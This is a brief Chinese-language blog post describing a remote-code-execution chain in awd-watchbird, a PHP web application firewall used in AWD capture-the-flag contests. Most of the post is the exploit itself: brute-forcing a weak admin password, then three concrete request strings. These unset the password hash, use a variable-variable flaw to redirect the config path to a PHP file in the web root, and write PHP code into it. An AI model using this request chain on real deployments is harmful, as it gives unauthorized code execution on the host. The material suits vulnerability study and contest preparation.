---
title: "awd-watchbird后台RCE"
author: ["4shen0ne"]
lastmod: 2024-12-14T01:40:04+08:00
draft: false
---

awd-watchbird 是一个 PHP Waf，一般用在 AWD[P] 比赛

后台 RCE 利用流程

1.  爆破弱口令，获取后台权限
2.  通过更新配置的接口可以修改配置项（key 为配置项，value 为对应的值）

    ```text
    ?watchbird=change&key=password_sha1&value=unset
    ```
3.  在更新逻辑中会使用可变变量 `$$key` 将配置项声明为变量，导致可以覆盖声明配置文件
    路径的变量

    ```text
    ?watchbird=change&key=config_path&value=/var/www/html/shell.php
    ```
4.  然后在配置中写入代码即可

    ```text
    ?watchbird=change&key=%3C?php%20phpinfo();%20?%3E&value=1
    ```
